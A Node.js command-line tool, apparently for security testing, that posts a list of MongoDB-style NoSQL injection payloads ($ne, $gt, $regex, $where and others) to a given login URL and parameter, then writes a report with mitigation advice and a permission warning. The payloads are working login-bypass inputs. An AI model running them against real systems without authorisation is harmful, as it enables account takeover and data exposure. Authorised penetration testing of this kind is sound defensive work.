#!/usr/bin/env node
/**
 * NoSQL Injection Tester
 * Tests for NoSQL injection vulnerabilities (MongoDB, etc.).
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class NoSQLInjectionTester {
    constructor(url) {
        this.url = url;
        this.payloads = [
            { $ne: null },
            { $gt: '' },
            { $regex: '.*' },
            { $where: '1==1' },
            { $or: [{ username: 'admin' }, { username: 'admin' }] },
            { username: { $ne: null } },
            { password: { $regex: '.*' } },
            { $where: 'this.username == this.password' }
        ];
        this.vulnerable = false;
    }

    makePostRequest(url, data, contentType = 'application/json') {
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https') ? https : http;
            const urlObj = new URL(url);
            
            const dataStr = contentType === 'application/json' 
                ? JSON.stringify(data) 
                : Object.entries(data).map(([k, v]) => `${k}=${encodeURIComponent(typeof v === 'object' ? JSON.stringify(v) : v)}`).join('&');
            
            const options = {
                hostname: urlObj.hostname,
                port: urlObj.port || (protocol === https ? 443 : 80),
                path: urlObj.pathname + urlObj.search,
                method: 'POST',
                headers: {
                    'Content-Type': contentType,
                    'Content-Length': Buffer.byteLength(dataStr)
                },
                timeout: 10000
            };
            
            const req = protocol.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    resolve({ statusCode: res.statusCode, text: responseData });
                });
            });
            
            req.on('error', (err) => {
                reject(err);
            });
            
            req.write(dataStr);
            req.end();
        });
    }

    async testNoSQLInjection(param, value = 'test') {
        console.log(`[*] Testing NoSQL injection in parameter: ${param}`);
        
        for (const payload of this.payloads) {
            try {
                const data = { [param]: payload };
                
                // Test as JSON
                const response = await this.makePostRequest(this.url, data, 'application/json');
                
                if (response.statusCode === 200 && response.text.toLowerCase().includes('success')) {
                    console.log('[+] Potential NoSQL injection found!');
                    this.vulnerable = true;
                    return true;
                }
                
                // Test as form data
                const formData = { [param]: JSON.stringify(payload) };
                const response2 = await this.makePostRequest(this.url, formData, 'application/x-www-form-urlencoded');
                
                if (response2.statusCode === 200 && response2.text.toLowerCase().includes('success')) {
                    console.log('[+] Potential NoSQL injection found!');
                    this.vulnerable = true;
                    return true;
                }
            } catch (err) {
                console.log(`[-] Error: ${err.message}`);
            }
        }
        
        return false;
    }

    generateReport() {
        let report = `# NoSQL Injection Test Report for ${this.url}\n\n`;
        
        if (this.vulnerable) {
            report += `⚠️ **VULNERABLE**: NoSQL injection vulnerability detected!\n\n`;
        } else {
            report += `✅ No NoSQL injection vulnerability detected.\n\n`;
        }
        
        report += `## Tested Payloads\n\n`;
        this.payloads.forEach((payload, i) => {
            report += `### Payload ${i + 1}\n\n`;
            report += `\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\`\n\n`;
        });
        
        report += `## Common NoSQL Injection Operators\n\n`;
        report += `- \`$ne\`: Not equal\n`;
        report += `- \`$gt\`: Greater than\n`;
        report += `- \`$regex\`: Regular expression\n`;
        report += `- \`$where\`: JavaScript evaluation\n`;
        report += `- \`$or\`: Logical OR\n\n`;
        
        report += `## Recommendations\n\n`;
        report += `1. Use parameterized queries\n`;
        report += `2. Validate input types\n`;
        report += `3. Sanitize user input\n`;
        report += `4. Use ORM/ODM frameworks\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 3) {
        console.log('Usage: node nosql_injection.js <url> [param]');
        console.log('Example: node nosql_injection.js http://example.com/login username');
        process.exit(1);
    }
    
    const url = process.argv[2];
    const param = process.argv[3] || 'username';
    
    const tester = new NoSQLInjectionTester(url);
    await tester.testNoSQLInjection(param);
    
    const report = tester.generateReport();
    
    const filename = 'nosql_injection_test_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] NoSQL injection testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = NoSQLInjectionTester;

